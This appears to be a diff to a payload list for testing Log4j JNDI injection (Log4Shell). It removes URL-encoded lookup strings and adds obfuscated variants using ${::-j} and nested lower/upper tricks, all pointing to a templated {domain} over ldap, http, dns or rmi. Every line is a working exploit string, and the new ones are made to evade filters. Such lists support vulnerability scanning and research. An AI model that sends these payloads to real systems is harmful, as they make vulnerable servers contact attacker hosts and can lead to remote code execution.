@@ -2,6 +2,7 @@ ${jndi:ldap://{domain}:1389/a}
 ${jndi:http://{domain}/a}
 ${jndi:dns://{domain}}
 ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://{domain}:1389/a}
-%24%7bjndi%3aldap%3a%2f%2f{domain}%3a1389%2fa%7d
-%24%7bjndi%3ahttp%3a%2f%2f{domain}%2fa%7d
-%24%7bjndi%3adns%3a%2f%2f{domain}%7d
+${${::-j}ndi:rmi://{domain}/a}
+${${lower:jndi}:${lower:rmi}://{domain}/a}
+${${upper:${upper:jndi}}:${upper:rmi}://{domain}/a}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{domain}/a}
